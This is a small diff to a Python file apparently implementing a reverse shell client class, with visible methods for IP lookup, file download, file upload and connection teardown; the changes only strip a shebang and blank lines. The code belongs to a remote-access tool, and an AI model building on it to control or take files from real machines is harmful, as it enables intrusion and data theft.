@@ -1,4 +1,3 @@
-#!/usr/bin/env python
 import os
 import platform
 import socket
@@ -98,7 +97,6 @@ class ReverseShellClient:
         except Exception as e:
             return f"Error getting IP info: {e}".encode()
         
-
     def download_file(self, local_path):
         try:
             save_dir = os.getcwd()
@@ -168,9 +166,6 @@ class ReverseShellClient:
             # print(f"debug: sending file (upload file): {local_path}")
             self.file_send(local_path)
             
-
-            
-       
     def kill_connection(self):
         """Gracefully terminate the connection"""
         self.alive = False
